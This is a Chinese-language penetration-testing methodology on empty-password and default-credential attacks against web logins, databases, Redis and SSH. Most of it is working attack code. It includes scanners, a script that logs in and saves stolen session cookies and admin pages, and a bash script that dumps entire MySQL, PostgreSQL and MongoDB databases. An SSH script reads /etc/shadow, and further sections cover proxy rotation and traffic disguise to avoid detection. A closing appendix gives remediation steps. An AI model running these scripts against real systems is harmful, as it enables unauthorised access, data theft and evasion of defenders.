# 空密码攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的空密码攻击检测和利用流程。空密码漏洞是指系统允许用户使用空密码或无密码进行认证，这是一种严重的安全配置错误，可能导致未授权访问。

## 1.2 适用范围

本文档适用于所有存在用户认证机制的系统，包括：
- Web 应用登录系统
- 数据库服务（MySQL、PostgreSQL、MongoDB）
- SSH/RDP 远程登录服务
- API 认证接口
- 管理后台和默认账户
- IoT 设备和嵌入式系统

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

空密码漏洞（Empty Password Vulnerability）是指系统允许用户使用空字符串或无密码进行认证。这通常是由于：
- 默认配置不当
- 管理员疏忽
- 开发/测试环境配置被部署到生产环境
- 密码被清除或重置后未正确设置新密码

**本质问题**：
- 认证机制未正确验证密码字段
- 系统信任客户端提交的认证数据
- 缺少密码复杂度强制策略

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-258 | 配置文件中的空密码 (Empty Password in Configuration File) |
| CWE-306 | 关键功能缺少认证 (Missing Authentication for Critical Function) |
| CWE-287 | 不当认证 (Improper Authentication) |
| CWE-798 | 使用硬编码凭证 (Use of Hard-coded Credentials) |

### 空密码漏洞风险等级

| 场景 | 风险等级 | 说明 |
|-----|---------|------|
| 管理员账户空密码 | 严重 | 完全系统控制权 |
| 数据库服务空密码 | 严重 | 数据完全暴露 |
| 默认账户空密码 | 高 | 预置账户可被利用 |
| 普通用户账户空密码 | 中 - 高 | 取决于账户权限 |
| API 服务空密码 | 高 | 可能导致数据泄露 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 数据库服务 | MySQL、PostgreSQL、MongoDB | 默认 root/admin 账户空密码 |
| SSH 服务 | 远程服务器登录 | 允许空密码认证配置 |
| Web 管理后台 | /admin、/manage | 默认管理员账户空密码 |
| IoT 设备 | 设备管理界面 | 出厂默认空密码 |
| API 服务 | REST API 认证 | API Key 为空或默认值 |
| 开发/测试环境 | 本地开发服务器 | 测试配置未修改 |
| 备份系统 | 备份服务认证 | 备份账户空密码 |
| 邮件服务 | SMTP/IMAP/POP3 | 匿名访问或空密码 |

### 常见空密码账户

| 服务类型 | 常见用户名 | 空密码风险 |
|---------|-----------|-----------|
| MySQL | root, admin, mysql | 高 |
| PostgreSQL | postgres, admin | 高 |
| MongoDB | admin, root | 高 |
| Redis | (无密码) | 高 |
| SSH | root, admin, test | 高 |
| FTP | anonymous, ftp, admin | 中 - 高 |
| Web Admin | admin, administrator, root | 高 |
| Tomcat | tomcat, admin, manager | 高 |
| Jenkins | admin, jenkins | 高 |

## 2.3 漏洞发现方法

### 2.3.1 黑盒检测方法

**Web 应用空密码检测**：

```bash
# 测试空密码登录
curl -X POST https://target.com/login \
    -d "username=admin&password="

curl -X POST https://target.com/login \
    -d "username=admin&password=" \
    -H "Content-Type: application/json" \
    --data-raw '{"username":"admin","password":""}'

# 检查响应
# 成功标志：
# - 重定向到仪表板
# - 返回认证 Token
# - 显示"登录成功"消息
```

**数据库空密码检测**：

```bash
# MySQL 空密码检测
mysql -u root -h target.com
mysql -u admin -h target.com
mysql -u root -p'' -h target.com

# PostgreSQL 空密码检测
psql -U postgres -h target.com
PGPASSWORD="" psql -U postgres -h target.com

# MongoDB 空密码检测
mongo target.com:27017
mongo -u admin -p '' target.com:27017

# Redis 空密码检测
redis-cli -h target.com
redis-cli -h target.com ping
# 如果返回 PONG，说明无密码保护
```

**SSH 空密码检测**：

```bash
# 使用 sshpass 测试空密码
sshpass -p '' ssh root@target.com
sshpass -p '' ssh admin@target.com

# 使用 Hydra 测试
hydra -l root -e n ssh://target.com
# -e n 表示尝试空密码
```

**自动化空密码扫描脚本**：

```python
#!/usr/bin/env python3
"""
空密码漏洞检测脚本
检测 Web 应用、数据库、服务的空密码配置
"""

import requests
import subprocess
import socket

class EmptyPasswordScanner:
    def __init__(self, target):
        self.target = target
        self.findings = []
    
    def scan_web_login(self, login_url, usernames):
        """扫描 Web 登录空密码"""
        print(f"[*] Scanning web login for empty passwords...")
        
        for username in usernames:
            try:
                # 尝试空密码登录
                response = requests.post(login_url, data={
                    'username': username,
                    'password': ''
                }, allow_redirects=False)
                
                # 检查是否登录成功
                if self._is_login_successful(response):
                    finding = {
                        'type': 'WEB_EMPTY_PASSWORD',
                        'username': username,
                        'url': login_url,
                        'severity': 'CRITICAL'
                    }
                    self.findings.append(finding)
                    print(f"[CRITICAL] Empty password works for: {username}")
                
            except Exception as e:
                print(f"[-] Error testing {username}: {e}")
    
    def scan_mysql(self, host, port=3306):
        """扫描 MySQL 空密码"""
        print(f"[*] Scanning MySQL for empty passwords...")
        
        usernames = ['root', 'admin', 'mysql', 'user']
        
        for username in usernames:
            try:
                result = subprocess.run(
                    ['mysql', '-u', username, '-h', host, '-P', str(port), 
                     '-e', 'SELECT 1;', '--connect_timeout=5'],
                    capture_output=True,
                    timeout=10
                )
                
                if result.returncode == 0:
                    finding = {
                        'type': 'MYSQL_EMPTY_PASSWORD',
                        'username': username,
                        'host': f"{host}:{port}",
                        'severity': 'CRITICAL'
                    }
                    self.findings.append(finding)
                    print(f"[CRITICAL] MySQL empty password for: {username}")
                    
            except Exception as e:
                pass
    
    def scan_redis(self, host, port=6379):
        """扫描 Redis 空密码"""
        print(f"[*] Scanning Redis for empty passwords...")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            sock.send(b'PING\r\n')
            response = sock.recv(1024)
            sock.close()
            
            if b'+PONG' in response:
                finding = {
                    'type': 'REDIS_NO_PASSWORD',
                    'host': f"{host}:{port}",
                    'severity': 'CRITICAL'
                }
                self.findings.append(finding)
                print(f"[CRITICAL] Redis has no password protection!")
                
        except Exception as e:
            pass
    
    def scan_ssh(self, host, port=22, usernames=None):
        """扫描 SSH 空密码"""
        print(f"[*] Scanning SSH for empty passwords...")
        
        if usernames is None:
            usernames = ['root', 'admin', 'test', 'user']
        
        for username in usernames:
            try:
                result = subprocess.run(
                    ['sshpass', '-p', '', 'ssh', '-o', 'StrictHostKeyChecking=no',
                     '-o', 'ConnectTimeout=5', '-p', str(port),
                     f'{username}@{host}', 'exit'],
                    capture_output=True,
                    timeout=10
                )
                
                if result.returncode == 0:
                    finding = {
                        'type': 'SSH_EMPTY_PASSWORD',
                        'username': username,
                        'host': f"{host}:{port}",
                        'severity': 'CRITICAL'
                    }
                    self.findings.append(finding)
                    print(f"[CRITICAL] SSH empty password for: {username}")
                    
            except Exception as e:
                pass
    
    def _is_login_successful(self, response):
        """判断登录是否成功"""
        # 检查重定向
        if response.status_code in [301, 302, 303]:
            return True
        
        # 检查响应内容
        success_indicators = [
            'welcome', 'dashboard', 'success', 'logged in',
            'token', 'session', 'redirect'
        ]
        
        response_text = response.text.lower()
        for indicator in success_indicators:
            if indicator in response_text:
                return True
        
        return False
    
    def generate_report(self):
        """生成扫描报告"""
        print("\n" + "="*60)
        print("Empty Password Vulnerability Report")
        print("="*60)
        
        if not self.findings:
            print("[PASS] No empty password vulnerabilities found")
        else:
            print(f"[FAIL] Found {len(self.findings)} empty password vulnerabilities:\n")
            for finding in self.findings:
                print(f"Type: {finding['type']}")
                print(f"Severity: {finding['severity']}")
                if 'username' in finding:
                    print(f"Username: {finding['username']}")
                if 'host' in finding:
                    print(f"Host: {finding['host']}")
                if 'url' in finding:
                    print(f"URL: {finding['url']}")
                print("-" * 40)

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
        scanner = EmptyPasswordScanner(target)
        
        # Web 扫描
        scanner.scan_web_login(f"{target}/login", ['admin', 'root', 'administrator'])
        
        # 服务扫描
        scanner.scan_mysql(target)
        scanner.scan_redis(target)
        scanner.scan_ssh(target)
        
        scanner.generate_report()
    else:
        print("Usage: python empty_password_scanner.py <target>")
```

### 2.3.2 白盒检测方法

**配置文件检查**：

```bash
# 检查 MySQL 配置
grep -r "password" /etc/mysql/
grep -r "skip-grant-tables" /etc/mysql/

# 检查 PostgreSQL 配置
cat /etc/postgresql/*/main/pg_hba.conf
# 查找 trust 认证方式

# 检查 SSH 配置
grep "PermitEmptyPasswords" /etc/ssh/sshd_config
# 如果是 yes，则允许空密码

# 检查应用配置
grep -r "password" /app/config/
grep -r "PASSWORD=" /app/.env
```

**代码审计要点**：

```python
# ❌ 危险模式：空密码检查缺失
def authenticate(username, password):
    user = db.query_user(username)
    if user:
        # 未检查密码是否为空
        return True
    return False

# ❌ 危险模式：空字符串被接受
def authenticate(username, password):
    if password == "":
        # 空密码被接受
        return login_as(username)

# ✅ 正确模式：拒绝空密码
def authenticate(username, password):
    if not password or password.strip() == "":
        return False  # 拒绝空密码
    user = db.query_user(username)
    if user and verify_password(user.password_hash, password):
        return True
    return False
```

## 2.4 漏洞利用方法

### 2.4.1 Web 应用空密码利用

```python
#!/usr/bin/env python3
"""
Web 应用空密码利用脚本
"""

import requests

class WebEmptyPasswordExploiter:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def exploit_empty_password(self, username):
        """利用空密码登录"""
        print(f"[*] Attempting empty password login for: {username}")
        
        response = self.session.post(self.target_url, data={
            'username': username,
            'password': ''
        })
        
        if response.status_code in [200, 302]:
            if 'success' in response.text.lower() or \
               'dashboard' in response.text.lower() or \
               response.status_code == 302:
                print(f"[SUCCESS] Empty password works for: {username}")
                
                # 保存会话 Cookie
                self.save_session(username)
                return True
        
        print(f"[-] Empty password failed for: {username}")
        return False
    
    def test_common_users(self):
        """测试常见用户名"""
        common_users = [
            'admin', 'administrator', 'root', 'superuser',
            'test', 'user', 'guest', 'manager',
            'webmaster', 'postmaster', 'hostmaster'
        ]
        
        successful = []
        for user in common_users:
            if self.exploit_empty_password(user):
                successful.append(user)
        
        return successful
    
    def save_session(self, username):
        """保存会话用于后续访问"""
        with open(f'session_{username}.txt', 'w') as f:
            for cookie in self.session.cookies:
                f.write(f"{cookie.name}={cookie.value}\n")
        print(f"[+] Session saved for: {username}")
    
    def post_exploitation(self):
        """利用成功登录后的操作"""
        # 访问敏感页面
        sensitive_pages = [
            '/admin', '/dashboard', '/users', '/settings',
            '/api/users', '/api/config', '/export'
        ]
        
        for page in sensitive_pages:
            try:
                response = self.session.get(f"{self.target_url.replace('/login', '')}{page}")
                if response.status_code == 200:
                    print(f"[+] Accessed: {page}")
                    # 保存敏感数据
                    with open(f'exploit_{page.replace("/", "_")}.html', 'wb') as f:
                        f.write(response.content)
            except:
                pass

if __name__ == '__main__':
    exploiter = WebEmptyPasswordExploiter('https://target.com/login')
    successful = exploiter.test_common_users()
    
    if successful:
        print(f"\n[+] Successfully exploited {len(successful)} account(s)")
        exploiter.post_exploitation()
```

### 2.4.2 数据库空密码利用

```bash
#!/bin/bash
# 数据库空密码利用脚本

TARGET=$1

echo "[*] Exploiting database empty passwords..."

# MySQL
echo "[*] Testing MySQL..."
for user in root admin mysql; do
    if mysql -u $user -h $TARGET -e "SELECT 1;" 2>/dev/null; then
        echo "[SUCCESS] MySQL empty password for: $user"
        # 导出数据
        mysqldump -u $user -h $TARGET --all-databases > mysql_dump.sql
    fi
done

# PostgreSQL
echo "[*] Testing PostgreSQL..."
for user in postgres admin; do
    if PGPASSWORD="" psql -U $user -h $TARGET -c "SELECT 1;" 2>/dev/null; then
        echo "[SUCCESS] PostgreSQL empty password for: $user"
        # 导出数据
        pg_dump -U $user -h $TARGET > postgres_dump.sql
    fi
done

# MongoDB
echo "[*] Testing MongoDB..."
if mongo $TARGET:27017 --eval "db.adminCommand('listDatabases')" 2>/dev/null; then
    echo "[SUCCESS] MongoDB has no password protection"
    # 导出数据
    mongodump --host $TARGET --out mongodb_dump
fi

# Redis
echo "[*] Testing Redis..."
if redis-cli -h $TARGET ping 2>/dev/null | grep -q PONG; then
    echo "[SUCCESS] Redis has no password protection"
    # 导出数据
    redis-cli -h $TARGET CONFIG GET "*" > redis_config.txt
    redis-cli -h $TARGET KEYS "*" > redis_keys.txt
fi
```

### 2.4.3 SSH 空密码利用

```bash
#!/bin/bash
# SSH 空密码利用脚本

TARGET=$1
USERS="root admin test user oracle ubuntu ec2-user"

echo "[*] Exploiting SSH empty passwords..."

for user in $USERS; do
    echo "[*] Testing user: $user"
    
    if sshpass -p '' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 $user@$TARGET "exit" 2>/dev/null; then
        echo "[SUCCESS] SSH empty password for: $user@$TARGET"
        
        # 保存凭证
        echo "$user@$TARGET" >> ssh_success.txt
        
        # 执行命令
        sshpass -p '' ssh -o StrictHostKeyChecking=no $user@$TARGET "whoami; id; uname -a" >> ssh_exploit_$user.txt
        
        # 收集敏感信息
        sshpass -p '' ssh -o StrictHostKeyChecking=no $user@$TARGET "cat /etc/passwd" >> ssh_exploit_$user.txt
        sshpass -p '' ssh -o StrictHostKeyChecking=no $user@$TARGET "cat /etc/shadow" >> ssh_exploit_$user.txt 2>/dev/null
    fi
done
```

### 2.4.4 默认账户空密码利用

```python
#!/usr/bin/env python3
"""
默认账户空密码利用脚本
针对常见服务和设备的默认账户
"""

import requests

# 常见服务默认账户
DEFAULT_CREDENTIALS = {
    'Tomcat Manager': [
        ('tomcat', ''),
        ('admin', ''),
        ('manager', ''),
        ('tomcat', 'tomcat'),
        ('admin', 'admin')
    ],
    'Jenkins': [
        ('admin', ''),
        ('jenkins', ''),
        ('admin', 'admin')
    ],
    'phpMyAdmin': [
        ('root', ''),
        ('admin', ''),
        ('root', 'root')
    ],
    'WebLogic': [
        ('weblogic', ''),
        ('weblogic', 'weblogic'),
        ('admin', 'admin')
    ],
    'JBoss': [
        ('admin', ''),
        ('admin', 'admin')
    ],
    'GitLab': [
        ('root', '5iveL!fe'),
        ('admin', ''),
        ('root', '')
    ],
    'Grafana': [
        ('admin', 'admin'),
        ('admin', '')
    ],
    'Elasticsearch': [
        ('elastic', ''),
        ('elastic', 'changeme')
    ]
}

def test_default_credentials(base_url, service):
    """测试默认凭证"""
    print(f"[*] Testing {service} default credentials...")
    
    for username, password in DEFAULT_CREDENTIALS.get(service, []):
        try:
            response = requests.post(
                f"{base_url}/login",
                data={'username': username, 'password': password},
                allow_redirects=False,
                timeout=10
            )
            
            if response.status_code in [200, 302]:
                if 'success' in response.text.lower() or response.status_code == 302:
                    print(f"[SUCCESS] {service}: {username}:{password or '(empty)'}")
                    return username, password
        except:
            pass
    
    return None, None

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) > 2:
        base_url = sys.argv[1]
        service = sys.argv[2]
        test_default_credentials(base_url, service)
    else:
        print("Usage: python default_creds.py <base_url> <service>")
        print(f"Available services: {', '.join(DEFAULT_CREDENTIALS.keys())}")
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过登录验证逻辑

```python
# 如果前端有空密码检查，尝试绕过

# 方法 1：直接 API 调用
curl -X POST https://target.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":""}'

# 方法 2：修改请求参数
# 将 password 参数删除或设置为空字符串
curl -X POST https://target.com/login \
    -d "username=admin"  # 不包含 password 参数

# 方法 3：使用 null 值
curl -X POST https://target.com/login \
    -d "username=admin&password=null"

# 方法 4：使用空格
curl -X POST https://target.com/login \
    -d "username=admin&password= "
```

### 2.5.2 绕过速率限制

```bash
# 空密码测试通常不需要绕过速率限制
# 因为只需要一次成功登录

# 但如果需要测试多个账户，使用 IP 轮换
for user in $(cat usernames.txt); do
    curl -X POST https://target.com/login \
        -d "username=$user&password=" \
        --proxy "http://proxy$(($RANDOM % 10)):8080"
done
```

### 2.5.3 隐蔽利用

```python
# 使用正常流量伪装
import requests
import time

session = requests.Session()

# 先访问公开页面
session.get('https://target.com/')
time.sleep(1)

session.get('https://target.com/about')
time.sleep(1)

# 然后尝试空密码登录
response = session.post('https://target.com/login', 
                       data={'username': 'admin', 'password': ''})

# 如果成功，立即执行操作并退出
if 'success' in response.text.lower():
    # 快速收集数据
    session.get('https://target.com/admin/users')
    session.get('https://target.com/admin/config')
    # 然后退出，减少被发现的风险
```

---

# 第三部分：附录

## 3.1 空密码检测速查表

| 服务 | 检测命令 | 成功标志 |
|-----|---------|---------|
| MySQL | `mysql -u root -h target` | 成功连接 |
| PostgreSQL | `psql -U postgres -h target` | 成功连接 |
| MongoDB | `mongo target:27017` | 成功连接 |
| Redis | `redis-cli -h target ping` | 返回 PONG |
| SSH | `sshpass -p '' ssh root@target` | 成功登录 |
| FTP | `ftp target` (用户名 anonymous) | 成功登录 |
| Web Login | `curl -d "user=admin&pass="` | 登录成功 |

## 3.2 常见空密码账户清单

| 服务 | 常见空密码账户 |
|-----|---------------|
| MySQL | root, admin, mysql |
| PostgreSQL | postgres, admin |
| MongoDB | admin, root |
| Redis | (无账户，无密码) |
| SSH | root, admin, test |
| Tomcat | tomcat, admin, manager |
| Jenkins | admin, jenkins |
| phpMyAdmin | root, admin |
| Elasticsearch | elastic |
| Grafana | admin |
| GitLab | root |
| WebLogic | weblogic |
| JBoss | admin |

## 3.3 修复建议

### 立即修复（严重风险）

1. **禁用空密码** - 配置服务拒绝空密码认证
2. **设置强密码** - 为所有账户设置强密码
3. **删除默认账户** - 删除或禁用不需要的默认账户

### 配置修复示例

**MySQL**：
```sql
-- 设置 root 密码
ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongP@ssw0rd!';

-- 检查空密码账户
SELECT user, host FROM mysql.user WHERE authentication_string = '';
```

**SSH**：
```bash
# 编辑 /etc/ssh/sshd_config
PermitEmptyPasswords no

# 重启 SSH 服务
systemctl restart sshd
```

**PostgreSQL**：
```bash
# 编辑 pg_hba.conf，将 trust 改为 md5 或 scram-sha-256
# 本地连接
host all all 127.0.0.1/32 md5
# 远程连接
host all all 0.0.0.0/0 md5
```

**Redis**：
```bash
# 编辑 redis.conf
requirepass StrongP@ssw0rd!

# 重启 Redis
systemctl restart redis
```

## 3.4 参考资源

- [CWE-258: Empty Password in Configuration File](https://cwe.mitre.org/data/definitions/258.html)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/)
- [NIST SP 800-63B Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
